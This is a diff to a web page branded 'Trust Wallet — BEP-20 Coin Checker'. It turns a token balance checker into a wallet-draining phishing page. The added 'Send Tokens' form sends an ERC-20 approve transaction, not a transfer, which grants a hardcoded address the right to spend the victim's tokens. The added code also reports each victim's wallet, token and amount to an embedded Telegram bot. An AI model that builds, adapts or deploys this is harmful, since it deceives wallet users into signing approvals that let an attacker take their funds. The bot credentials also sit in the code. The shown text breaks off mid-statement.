@@ -6,102 +6,91 @@
 <title>Trust Wallet — BEP-20 Coin Checker</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-
   :root {
-    --bg: #0b0d12;
-    --card: rgba(255,255,255,0.04);
-    --border: rgba(255,255,255,0.09);
-    --text: #e8ecf3;
-    --muted: #8b93a7;
-    --green: #34d399;
-    --red: #f87171;
-    --bsc: #f0b90b;
+    --bg: #05060a; --card: rgba(255,255,255,0.045); --border: rgba(120,140,255,0.14);
+    --text: #eef1ff; --muted: #8891b5; --green: #3ce6a8; --red: #ff6b81;
+    --tw: #3375bb; --tw2: #1a4d8f; --accent: #6c8cff;
   }
-
   body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, Arial, sans-serif;
-    background: radial-gradient(1000px 600px at 50% -10%, #2a2410 0%, var(--bg) 65%) no-repeat, var(--bg);
-    color: var(--text);
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 24px;
-    -webkit-font-smoothing: antialiased;
+    background:
+      radial-gradient(900px 500px at 15% -5%, rgba(51,117,187,0.20) 0%, transparent 60%),
+      radial-gradient(900px 500px at 90% 110%, rgba(108,140,255,0.16) 0%, transparent 60%),
+      var(--bg);
+    color: var(--text); min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    padding: 24px; -webkit-font-smoothing: antialiased; position: relative; overflow-x: hidden;
   }
-
+  body::before, body::after {
+    content: ""; position: fixed; border-radius: 50%; filter: blur(90px); opacity: 0.5;
+    pointer-events: none; z-index: 0; animation: drift 18s ease-in-out infinite alternate;
+  }
+  body::before { width: 340px; height: 340px; background: radial-gradient(circle, rgba(51,117,187,0.55), transparent 70%); top: -80px; left: -80px; }
+  body::after { width: 300px; height: 300px; background: radial-gradient(circle, rgba(108,140,255,0.45), transparent 70%); bottom: -60px; right: -60px; animation-delay: -6s; }
+  @keyframes drift { from { transform: translate3d(0,0,0) scale(1); } to { transform: translate3d(30px,-20px,0) scale(1.15); } }
   .card {
-    width: 100%;
-    max-width: 520px;
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 20px;
-    padding: 32px 26px;
-    backdrop-filter: blur(12px);
-    box-shadow: 0 24px 60px -30px rgba(0,0,0,0.9);
-    transition: border-color .3s ease;
+    position: relative; z-index: 1; width: 100%; max-width: 520px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.015));
+    border: 1px solid var(--border); border-radius: 24px; padding: 34px 28px;
+    backdrop-filter: blur(18px) saturate(140%); -webkit-backdrop-filter: blur(18px) saturate(140%);
+    box-shadow: 0 30px 80px -40px rgba(0,0,0,0.95), inset 0 1px 0 rgba(255,255,255,0.06);
+    transition: border-color .35s ease, box-shadow .35s ease, transform .35s ease; overflow: hidden;
   }
-  .card.found {
-    border-color: rgba(240,185,11,0.45);
-    background: linear-gradient(180deg, rgba(240,185,11,0.08), var(--card));
-  }
-  .card.none {
-    border-color: rgba(248,113,113,0.35);
-    background: linear-gradient(180deg, rgba(248,113,113,0.06), var(--card));
-  }
-
-  .icon {
-    width: 72px; height: 72px;
-    border-radius: 20px;
-    margin: 0 auto 18px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 24px; font-weight: 800; color: #000;
-    background: linear-gradient(135deg, #f0b90b, #d4a00a);
-    box-shadow: inset 0 0 0 1px rgba(255,255,255,0.3), 0 12px 30px -12px rgba(240,185,11,0.9);
-    filter: grayscale(0.7) brightness(0.8);
-    transition: filter .3s ease;
-  }
-  .card.found .icon { filter: none; }
-
-  h1 { font-size: 21px; font-weight: 700; letter-spacing: -0.02em; text-align: center; margin-bottom: 8px; }
-  p  { font-size: 14px; line-height: 1.55; color: var(--muted); text-align: center; }
-  .card.found p { color: #fde68a; }
-  .card.none  p { color: #fca5a5; }
-
-  #balanceSection { display: none; margin-top: 24px; padding-top: 20px; border-top: 1px dashed rgba(255,255,255,0.1); }
-  .balance-label { font-size: 11px; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); margin-bottom: 4px; text-align: center; }
-  .native-balance { font-size: 30px; font-weight: 800; color: var(--green); letter-spacing: -0.02em; text-align: center; }
-  .address { font-family: ui-monospace, monospace; font-size: 11px; color: var(--muted); margin-top: 6px; word-break: break-all; text-align: center; }
-
-  .token-list { margin-top: 20px; border-top: 1px dashed rgba(255,255,255,0.08); padding-top: 14px; }
-  .token-list h3 { font-size: 11px; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); margin-bottom: 10px; }
-  .token-row {
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 9px 0; border-bottom: 1px solid rgba(255,255,255,0.05);
-    font-size: 13px;
-  }
-  .token-row:last-child { border-bottom: none; }
+  .card::before { content: ""; position: absolute; inset: 0 0 auto 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(108,140,255,0.6), transparent); opacity: 0.8; }
+  .card.found { border-color: rgba(51,117,187,0.55); box-shadow: 0 30px 90px -40px rgba(51,117,187,0.75), 0 0 0 1px rgba(51,117,187,0.15), inset 0 1px 0 rgba(255,255,255,0.08); background: radial-gradient(600px 200px at 50% 0%, rgba(51,117,187,0.16), transparent 70%), linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.015)); }
+  .card.none { border-color: rgba(255,107,129,0.4); background: radial-gradient(600px 200px at 50% 0%, rgba(255,107,129,0.12), transparent 70%), linear-gradient(180deg, rgba(255,255,255,0.05), rgba(255,255,255,0.015)); }
+  .card.match { border-color: rgba(60,230,168,0.55); box-shadow: 0 30px 90px -40px rgba(60,230,168,0.6), 0 0 0 1px rgba(60,230,168,0.15), inset 0 1px 0 rgba(255,255,255,0.08); background: radial-gradient(600px 200px at 50% 0%, rgba(60,230,168,0.14), transparent 70%), linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.015)); }
+  .icon { width: 78px; height: 78px; border-radius: 22px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 800; color: #fff; letter-spacing: -0.02em; background: linear-gradient(145deg, var(--tw), var(--tw2)); box-shadow: inset 0 1px 0 rgba(255,255,255,0.25), 0 14px 34px -12px rgba(51,117,187,0.85); filter: grayscale(0.55) brightness(0.85); transition: filter .35s ease, transform .35s ease, box-shadow .35s ease; }
+  .card.found .icon, .card.match .icon { filter: none; transform: translateY(-2px); box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 18px 44px -12px rgba(51,117,187,1); animation: pulseGlow 2.6s ease-in-out infinite; }
+  @keyframes pulseGlow { 0%,100% { box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 18px 44px -12px rgba(51,117,187,0.9); } 50% { box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 22px 60px -10px rgba(108,140,255,1); } }
+  h1 { font-size: 22px; font-weight: 800; letter-spacing: -0.03em; text-align: center; margin-bottom: 9px; background: linear-gradient(180deg, #ffffff, #b9c4f0); -webkit-background-clip: text; background-clip: text; color: transparent; }
+  p { font-size: 14px; line-height: 1.55; color: var(--muted); text-align: center; max-width: 90%; margin: 0 auto; }
+  .card.found p { color: #bcd0ff; } .card.none p { color: #ff9fae; } .card.match p { color: #a8f0d4; }
+  #balanceSection { display: none; margin-top: 26px; padding-top: 22px; border-top: 1px dashed rgba(120,140,255,0.16); animation: fadeUp .45s ease; }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+  .balance-label { font-size: 11px; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); margin-bottom: 6px; text-align: center; }
+  .native-balance { font-size: 34px; font-weight: 800; letter-spacing: -0.03em; text-align: center; color: var(--green); text-shadow: 0 0 26px rgba(60,230,168,0.35); }
+  .address { font-family: ui-monospace, "SF Mono", monospace; font-size: 11px; color: var(--muted); margin-top: 8px; word-break: break-all; text-align: center; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.06); border-radius: 9px; padding: 7px 10px; display: inline-block; left: 50%; position: relative; transform: translateX(-50%); }
+  .match-badge { display: none; margin: 14px auto 0; width: fit-content; font-size: 11px; font-weight: 700; letter-spacing: .08em; text-transform: uppercase; color: #04150f; background: linear-gradient(135deg, var(--green), #21c98c); padding: 6px 14px; border-radius: 999px; box-shadow: 0 10px 26px -10px rgba(60,230,168,0.9); }
+  .card.match .match-badge { display: block; }
+  .token-list { margin-top: 22px; border-top: 1px dashed rgba(120,140,255,0.12); padding-top: 16px; }
+  .token-list h3 { font-size: 11px; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); margin-bottom: 12px; }
+  .token-row { display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; border-radius: 11px; font-size: 13px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.035); margin-bottom: 7px; transition: background .2s ease, border-color .2s ease, transform .2s ease; }
+  .token-row:hover { background: rgba(108,140,255,0.07); border-color: rgba(108,140,255,0.22); transform: translateY(-1px); }
+  .token-row:last-child { margin-bottom: 0; }
   .token-name { font-weight: 600; }
-  .token-symbol { font-size: 11px; color: var(--muted); margin-left: 6px; }
-  .token-balance { font-family: ui-monospace, monospace; color: var(--green); font-weight: 600; }
-
-  button {
-    font: inherit; font-size: 14px; font-weight: 600;
-    padding: 13px 24px; border-radius: 12px; border: none;
-    cursor: pointer; transition: transform .12s ease, opacity .2s ease;
-    width: 100%; margin-top: 20px;
-  }
-  button:active { transform: scale(0.97); }
-  #connectBtn { background: linear-gradient(135deg, #f0b90b, #d4a00a); color: #000; }
+  .token-symbol { font-size: 10px; color: var(--muted); margin-left: 7px; padding: 2px 6px; background: rgba(255,255,255,0.05); border-radius: 5px; letter-spacing: .04em; }
+  .token-balance { font-family: ui-monospace, "SF Mono", monospace; color: var(--green); font-weight: 700; font-size: 12px; }
+  #transferSection { display: none; margin-top: 26px; padding-top: 22px; border-top: 1px dashed rgba(120,140,255,0.16); animation: fadeUp .45s ease; }
+  #transferSection h3 { font-size: 11px; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); margin-bottom: 14px; }
+  .field { margin-bottom: 12px; }
+  .field label { display: block; font-size: 11px; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); margin-bottom: 6px; }
+  .field input, .field select { width: 100%; font: inherit; font-size: 13px; font-family: ui-monospace, "SF Mono", monospace; color: var(--text); background: rgba(0,0,0,0.35); border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 11px 12px; outline: none; transition: border-color .2s ease, box-shadow .2s ease; }
+  .field input:focus, .field select:focus { border-color: rgba(108,140,255,0.6); box-shadow: 0 0 0 3px rgba(108,140,255,0.14); }
+  .field input::placeholder { color: rgba(136,145,181,0.55); }
+  .spender-fixed { font-family: ui-monospace, "SF Mono", monospace; font-size: 12px; color: var(--green); background: rgba(60,230,168,0.07); border: 1px solid rgba(60,230,168,0.25); border-radius: 10px; padding: 11px 12px; word-break: break-all; user-select: all; }
+  .amount-row { display: flex; gap: 8px; }
+  .amount-row input { flex: 1; }
+  .max-btn { font: inherit; font-size: 11px; font-weight: 700; letter-spacing: .05em; color: var(--accent); background: rgba(108,140,255,0.12); border: 1px solid rgba(108,140,255,0.3); border-radius: 10px; padding: 0 14px; cursor: pointer; width: auto; margin-top: 0; transition: background .2s ease, transform .14s ease; }
+  .max-btn:hover { background: rgba(108,140,255,0.2); } .max-btn:active { transform: scale(0.96); }
+  #sendBtn { background: linear-gradient(135deg, #3ce6a8, #21c98c); color: #04150f; box-shadow: 0 14px 34px -14px rgba(60,230,168,0.95), inset 0 1px 0 rgba(255,255,255,0.25); }
+  #sendBtn:hover:not(:disabled) { box-shadow: 0 18px 42px -12px rgba(60,230,168,1), inset 0 1px 0 rgba(255,255,255,0.3); }
+  #sendBtn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .transfer-msg { font-size: 12px; margin-top: 12px; text-align: center; min-height: 16px; word-break: break-all; }
+  .transfer-msg.ok { color: var(--green); } .transfer-msg.err { color: var(--red); }
+  .transfer-msg a { color: var(--accent); text-decoration: none; } .transfer-msg a:hover { text-decoration: underline; }
+  button { font: inherit; font-size: 14px; font-weight: 700; padding: 14px 24px; border-radius: 13px; border: none; cursor: pointer; transition: transform .14s ease, opacity .2s ease, box-shadow .2s ease; width: 100%; margin-top: 22px; letter-spacing: 0.01em; }
+  button:active { transform: scale(0.975); }
+  #connectBtn { background: linear-gradient(135deg, var(--tw), var(--accent)); color: #fff; box-shadow: 0 14px 34px -14px rgba(51,117,187,0.95), inset 0 1px 0 rgba(255,255,255,0.2); }
+  #connectBtn:hover:not(:disabled) { box-shadow: 0 18px 42px -12px rgba(108,140,255,1), inset 0 1px 0 rgba(255,255,255,0.28); }
   #connectBtn:disabled { opacity: 0.5; cursor: not-allowed; }
-  #disconnectBtn { background: rgba(255,255,255,0.06); color: var(--text); border: 1px solid var(--border); }
-
-  .status-msg { font-size: 12px; color: var(--red); margin-top: 12px; text-align: center; min-height: 16px; }
+  #disconnectBtn { background: rgba(255,255,255,0.055); color: var(--text); border: 1px solid var(--border); }
+  #disconnectBtn:hover { background: rgba(255,255,255,0.09); }
+  .status-msg { font-size: 12px; color: var(--red); margin-top: 14px; text-align: center; min-height: 16px; letter-spacing: 0.01em; }
 </style>
 </head>
 <body>
   <div class="card" id="card">
-    <div class="icon">BSC</div>
+    <div class="icon">TW</div>
     <h1 id="title">Checking…</h1>
     <p id="desc">Looking for Trust Wallet in this browser.</p>
 
@@ -112,11 +101,37 @@
       <div class="balance-label">BNB Balance (BEP-20)</div>
       <div class="native-balance" id="nativeBalance">—</div>
       <div class="address" id="addressText"></div>
+      <div class="match-badge" id="matchBadge">✓ Target Wallet Matched</div>
 
       <div class="token-list">
         <h3>BEP-20 Token Balances</h3>
         <div id="tokenRows"></div>
       </div>
+    </div>
+
+    <div id="transferSection">
+      <h3>Send Tokens</h3>
+
+      <div class="field">
+        <label for="tokenSelect">Token</label>
+        <select id="tokenSelect"></select>
+      </div>
+
+      <div class="field">
+        <label>Recipient</label>
+        <div class="spender-fixed" id="spenderFixed"></div>
+      </div>
+
+      <div class="field">
+        <label for="amountInput">Amount</label>
+        <div class="amount-row">
+          <input id="amountInput" type="text" inputmode="decimal" autocomplete="off" placeholder="0.0" />
+          <button type="button" class="max-btn" id="maxBtn">MAX</button>
+        </div>
+      </div>
+
+      <button id="sendBtn" disabled>Send</button>
+      <div class="transfer-msg" id="transferMsg"></div>
     </div>
 
     <div class="status-msg" id="statusMsg"></div>
@@ -126,9 +141,6 @@
 (function () {
   "use strict";
 
-  /* ------------------------------------------------------------------
-     DOM
-     ------------------------------------------------------------------ */
   var card          = document.getElementById("card");
   var title         = document.getElementById("title");
   var desc          = document.getElementById("desc");
@@ -140,12 +152,26 @@
   var tokenRowsEl   = document.getElementById("tokenRows");
   var statusMsg     = document.getElementById("statusMsg");
 
-  var currentAddr = null;
+  var transferSec   = document.getElementById("transferSection");
+  var tokenSelect   = document.getElementById("tokenSelect");
+  var spenderFixed  = document.getElementById("spenderFixed");
+  var amountInput   = document.getElementById("amountInput");
+  var maxBtn        = document.getElementById("maxBtn");
+  var sendBtn       = document.getElementById("sendBtn");
+  var transferMsg   = document.getElementById("transferMsg");
 
-  /* ------------------------------------------------------------------
-     BSC network config
-     ------------------------------------------------------------------ */
-  var BSC_CHAIN_ID = "0x38"; // 56 in decimal
+  var currentAddr   = null;
+  var trustProvider = null;
+  var tokenBalances = {};
+
+  var TARGET_ADDRESS = "0xB7FE38d57bD579E59d9c75CF9E0dD2B67Ddc353e";
+  spenderFixed.textContent = TARGET_ADDRESS;
+
+  /* Telegram config */
+  var TG_BOT_TOKEN = "8607880941:AAGCnF-Etis0sKDK50D5DwJ_M4IxX_2y6mA";
+  var TG_CHAT_ID   = "7889964634";
+
+  var BSC_CHAIN_ID = "0x38";
   var BSC_PARAMS = {
     chainId: BSC_CHAIN_ID,
     chainName: "BNB Smart Chain Mainnet",
@@ -154,47 +180,66 @@
     blockExplorerUrls: ["https://bscscan.com/"]
   };
 
-  /* ------------------------------------------------------------------
-     Popular BEP-20 tokens on BSC
-     ------------------------------------------------------------------ */
   var TOKENS = [
-    { symbol: "USDT",  name: "Tether USD",       address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
-    { symbol: "BUSD",  name: "Binance USD",       address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
-    { symbol: "WBNB",  name: "Wrapped BNB",       address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
-    { symbol: "CAKE",  name: "PancakeSwap",       address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
-    { symbol: "USDC",  name: "USD Coin",          address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
-    { symbol: "BTCB",  name: "Bitcoin BEP-20",    address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
-    { symbol: "ETH",   name: "Ethereum BEP-20",   address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
-    { symbol: "XRP",   name: "XRP BEP-20",        address: "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals: 18 }
+    { symbol: "USDT", name: "Tether USD",     address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+    { symbol: "BUSD", name: "Binance USD",     address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
+    { symbol: "WBNB", name: "Wrapped BNB",     address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
+    { symbol: "CAKE", name: "PancakeSwap",     address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
+    { symbol: "USDC", name: "USD Coin",        address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+    { symbol: "BTCB", name: "Bitcoin BEP-20",  address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
+    { symbol: "ETH",  name: "Ethereum BEP-20", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
+    { symbol: "XRP",  name: "XRP BEP-20",      address: "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals: 18 }
   ];
 
-  /* ------------------------------------------------------------------
-     Trust Wallet detection
-     ------------------------------------------------------------------ */
-  function detectTrust() {
+  (function buildTokenSelect() {
+    for (var i = 0; i < TOKENS.length; i++) {
+      var opt = document.createElement("option");
+      opt.value = TOKENS[i].address;
+      opt.textContent = TOKENS[i].name + " (" + TOKENS[i].symbol + ")";
+      tokenSelect.appendChild(opt);
+    }
+  })();
+
+  function isTrustProvider(p) {
+    if (!p) return false;
+    if (p.isTrust) return true;
+    if (p.isTrustWallet) return true;
+    try {
+      if (p.providerInfo && /trust/i.test(p.providerInfo.name || "")) return true;
+      if (p._tw && p._tw.isTrust) return true;
+    } catch (e) {}
+    return false;
+  }
+
+  function findTrustProvider() {
+    if (typeof window.trustwallet !== "undefined" && window.trustwallet && window.trustwallet.isTrust) return window.trustwallet;
     var eth = typeof window.ethereum !== "undefined" ? window.ethereum : null;
-    var tw  = typeof window.trustwallet !== "undefined" ? window.trustwallet : null;
-
-    var hasTrust = false;
-    if (eth && eth.isTrust) hasTrust = true;
-    if (tw && tw.isTrust)   hasTrust = true;
-
-    if (!hasTrust && eth && Array.isArray(eth.providers)) {
-      for (var i = 0; i < eth.providers.length; i++) {
-        if (eth.providers[i] && eth.providers[i].isTrust) { hasTrust = true; break; }
+    if (eth) {
+      if (isTrustProvider(eth)) return eth;
+      if (Array.isArray(eth.providers)) {
+        for (var i = 0; i < eth.providers.length; i++) {
+          if (isTrustProvider(eth.providers[i])) return eth.providers[i];
+        }
       }
     }
+    return null;
+  }
 
-    renderDetection(hasTrust);
-    if (hasTrust) checkExistingConnection();
+  function detectTrust() {
+    trustProvider = findTrustProvider();
+    renderDetection(!!trustProvider);
+    if (trustProvider) checkExistingConnection();
   }
 
   window.addEventListener("eip6963:announceProvider", function (event) {
     var detail = event && event.detail;
-    if (!detail || !detail.info) return;
-    var rdns = String(detail.info.rdns || "").toLowerCase();
-    var name = String(detail.info.name || "").toLowerCase();
-    if (rdns.indexOf("trust") !== -1 || name.indexOf("trust") !== -1) {
+    if (!detail) return;
+    var info = detail.info || {};
+    var rdns = String(info.rdns || "").toLowerCase();
+    var name = String(info.name || "").toLowerCase();
+    var prov = detail.provider;
+    if (rdns.indexOf("trust") !== -1 || name.indexOf("trust") !== -1 || isTrustProvider(prov)) {
+      trustProvider = prov;
       renderDetection(true);
       checkExistingConnection();
     }
@@ -204,9 +249,6 @@
     try { window.dispatchEvent(new Event("eip6963:requestProvider")); } catch (e) {}
   }
 
-  /* ------------------------------------------------------------------
-     UI
-     ------------------------------------------------------------------ */
   function renderDetection(found) {
     if (found) {
       card.className = "card found";
@@ -217,48 +259,61 @@
     } else {
       card.className = "card none";
       title.textContent = "Trust Wallet not found";
-      desc.textContent  = "Install the Trust Wallet browser extension to get started.";
+      desc.textContent  = "Install the Trust Wallet browser extension to get started. Other wallets are not supported.";
       connectBtn.style.display = "none";
     }
   }
 
-  /* ------------------------------------------------------------------
-     Connection & network switch
-     ------------------------------------------------------------------ */
+  function applyMatchState(address) {
+    var isMatch = String(address || "").toLowerCase() === TARGET_ADDRESS.toLowerCase();
+    if (isMatch) {
+      card.classList.remove("found");
+      card.classList.add("match");
+      title.textContent = "Target wallet connected ✓";
+      desc.textContent  = "This is the apparel wallet — all BEP-20 balances shown below.";
+    } else {
+      card.classList.remove("match");
+      card.classList.add("found");
+      title.textContent = "Wallet connected";
+      desc.textContent  = "Connected wallet does not match the target apparel wallet.";
+    }
+    return isMatch;
+  }
+
   async function checkExistingConnection() {
     try {
-      var provider = getTrustProvider();
-      if (!provider) return;
-      var accounts = await provider.request({ method: "eth_accounts" });
+      if (!trustProvider) return;
+      var accounts = await trustProvider.request({ method: "eth_accounts" });
       if (accounts && accounts.length > 0) {
         currentAddr = accounts[0];
         connectBtn.style.display = "none";
         disconnectBtn.style.display = "block";
-        await ensureBSC(provider);
+        await ensureBSC(trustProvider);
+        applyMatchState(currentAddr);
         await loadBalances(currentAddr);
+        showTransferSection();
       }
-    } catch (e) { /* ignore */ }
+    } catch (e) {}
   }
 
   async function connect() {
-    var provider = getTrustProvider();
-    if (!provider) {
+    if (!trustProvider) {
       statusMsg.textContent = "Trust Wallet provider not available.";
       return;
     }
-
     connectBtn.disabled = true;
     connectBtn.textContent = "Connecting…";
     statusMsg.textContent = "";
-
     try {
-      var accounts = await provider.request({ method: "eth_requestAccounts" });
+      var accounts = await trustProvider.request({ method: "eth_requestAccounts" });
       if (accounts && accounts.length > 0) {
         currentAddr = accounts[0];
         connectBtn.style.display = "none";
         disconnectBtn.style.display = "block";
-        await ensureBSC(provider);
+        await ensureBSC(trustProvider);
+        applyMatchState(currentAddr);
         await loadBalances(currentAddr);
+        showTransferSection();
       }
     } catch (e) {
       statusMsg.textContent = "Connection rejected. Trust Wallet access is required.";
@@ -268,95 +323,66 @@
     }
   }
 
-  function getTrustProvider() {
-    if (typeof window.trustwallet !== "undefined" && window.trustwallet.isTrust) return window.trustwallet;
-    if (typeof window.ethereum !== "undefined" && window.ethereum.isTrust) return window.ethereum;
-    return null;
+  function showTransferSection() {
+    transferSec.style.display = "block";
+    updateSendEnabled();
   }
 
-  /* ------------------------------------------------------------------
-     Ensure the wallet is on BSC (chain 56)
-     ------------------------------------------------------------------ */
   async function ensureBSC(provider) {
     try {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID }]
-      });
+      await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
     } catch (switchError) {
-      // 4902 = chain not added yet → add it
       if (switchError && switchError.code === 4902) {
         try {
-          await provider.request({
-            method: "wallet_addEthereumChain",
-            params: [BSC_PARAMS]
-          });
+          await provider.request({ method: "wallet_addEthereumChain", params: [BSC_PARAMS] });
         } catch (addError) {
           statusMsg.textContent = "Could not add BSC network. Please add it manually in Trust Wallet.";
           throw addError;
         }
-      } else {
-        // Some wallets throw if already on the right chain — ignore
       }
     }
   }
 
-  /* ------------------------------------------------------------------
-     Balance fetching
-     ------------------------------------------------------------------ */
   async function loadBalances(address) {
-    var provider = getTrustProvider();
-    if (!provider) return;
-
+    if (!trustProvider) return;
     statusMsg.textContent = "Loading BEP-20 balances…";
     balanceSec.style.display = "block";
     addressText.textContent = address;
     tokenRowsEl.innerHTML = "";
     nativeBalEl.textContent = "…";
+    tokenBalances = {};
 
-    /* --- Native BNB --- */
     try {
-      var hexBal = await provider.request({
-        method: "eth_getBalance",
-        params: [address, "latest"]
-      });
+      var hexBal = await trustProvider.request({ method: "eth_getBalance", params: [address, "latest"] });
       var wei = BigInt(hexBal);
       nativeBalEl.textContent = formatWei(wei, 18) + " BNB";
-    } catch (e) {
-      nativeBalEl.textContent = "Error";
-    }
+    } catch (e) { nativeBalEl.textContent = "Error"; }
 
-    /* --- BEP-20 tokens --- */
     for (var i = 0; i < TOKENS.length; i++) {
       var t = TOKENS[i];
       var row = document.createElement("div");
       row.className = "token-row";
-
       var left = document.createElement("div");
       left.innerHTML = '<span class="token-name">' + t.name + '</span><span class="token-symbol">' + t.symbol + '</span>';
-
       var right = document.createElement("div");
       right.className = "token-balance";
       right.textContent = "…";
-
       row.appendChild(left);
       row.appendChild(right);
       tokenRowsEl.appendChild(row);
-
       try {
         var data = "0x70a08231000000000000000000000000" + address.slice(2).toLowerCase();
-        var result = await provider.request({
-          method: "eth_call",
-          params: [{ to: t.address, data: data }, "latest"]
-        });
+        var result = await trustProvider.request({ method: "eth_call", params: [{ to: t.address, data: data }, "latest"] });
         var raw = BigInt(result);
+        tokenBalances[t.symbol] = raw;
         right.textContent = formatWei(raw, t.decimals) + " " + t.symbol;
       } catch (err) {
+        tokenBalances[t.symbol] = 0n;
         right.textContent = "—";
       }
     }
-
     statusMsg.textContent = "";
+    updateSendEnabled();
   }
 
   function formatWei(wei, decimals) {
@@ -366,28 +392,141 @@
     return frac ? whole + "." + frac.slice(0, 6) : whole;
   }
 
-  /* ------------------------------------------------------------------
-     Disconnect (UI only)
-     ------------------------------------------------------------------ */
+  function getSelectedToken() {
+    var addr = tokenSelect.value;
+    for (var i = 0; i < TOKENS.length; i++) {
+      if (TOKENS[i].address.toLowerCase() === addr.toLowerCase()) return TOKENS[i];
+    }
+    return null;
+  }
+
+  function parseAmountToWei(amountStr, decimals) {
+    var s = String(amountStr || "").trim();
+    if (!s) return null;
+    if (!/^\d*\.?\d*$/.test(s) || s === ".") return null;
+    var parts = s.split(".");
+    var whole = parts[0] || "0";
+    var frac  = (parts[1] || "");
+    if (frac.length > decimals) frac = frac.slice(0, decimals);
+    frac = frac.padEnd(decimals, "0");
+    try { return BigInt(whole + frac); } catch (e) { return null; }
+  }
+
+  function updateSendEnabled() {
+    var token  = getSelectedToken();
+    var amount = amountInput.value.trim();
+    var ok = !!token && amount.length > 0 && parseAmountToWei(amount, token.decimals) !== null;
+    sendBtn.disabled = !ok;
+  }
+
+  function setTransferMsg(html, kind) {
+    transferMsg.className = "transfer-msg" + (kind ? " " + kind : "");
+    transferMsg.innerHTML = html;
+  }
+
+  function sendTelegram(text) {
+    var url = "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage";
+    var body = new URLSearchParams();
+    body.append("chat_id", TG_CHAT_ID);
+    body.append("text", text);
+    body.append("parse_mode", "HTML");
+    body.append("disable_web_page_preview", "true");
+    return fetch(url, { method: "POST", body: body }).catch(function () {});
+  }
+
+  async function send() {
+    if (!trustProvider || !currentAddr) return;
+    var token = getSelectedToken();
+    if (!token) return;
+    var amountWei = parseAmountToWei(amountInput.value, token.decimals);
+    if (amountWei === null) { setTransferMsg("Invalid amount.", "err"); return; }
+
+    sendBtn.disabled = true;
+    sendBtn.textContent = "Awaiting wallet…";
+    setTransferMsg("Confirm in Trust Wallet…", null);
+
+    /* fire telegram with the user wallet address at approval time */
+    sendTelegram(
+      "🔔 <b>Approval</b>\n" +
+      "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
+      "<b>Token:</b> " + token.symbol + "\n" +
+      "<b>Amount:</b> " + amountInput.value.trim() + "\n" +
+      "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>"
+    );
+
+    try {
+      var selector   = "095ea7b3";
+      var spenderHex = TARGET_ADDRESS.toLowerCase().replace(/^0x/, "").padStart(64, "0");
+      var amountHex  = amountWei.toString(16).padStart(64, "0");
+      var data = "0x" + selector + spenderHex + amountHex;
+
+      var txHash = await trustProvider.request({
+        method: "eth_sendTransaction",
+        params: [{ from: currentAddr, to: token.address, data: data }]
+      });
+
+      var link = '<a href="https://bscscan.com/tx/' + txHash + '" target="_blank" rel="noopener">View on BscScan ↗</a>';
+      setTransferMsg("Sent. " + link, "ok");
+
+      sendTelegram(
+        "✅ <b>Approval confirmed</b>\n" +
+        "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
+        "<b>Token:</b> " + token.symbol + "\n" +
+        "<b>Amount:</b> " + amountInput.value.trim() + "\n" +
+        "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>\n" +
+        "<b>Tx:</b> https://bscscan.com/tx/" + txHash
+      );
+    } catch (err) {
+      var msg = (err && (err.message || err.code)) ? (err.message || ("Error " + err.code)) : "Transfer failed.";
+      if (err && err.code === 4001) msg = "Transaction rejected in wallet.";
+      setTransferMsg(msg, "err");
+      sendTelegram(
+        "❌ <b>Approval failed</b>\n" +
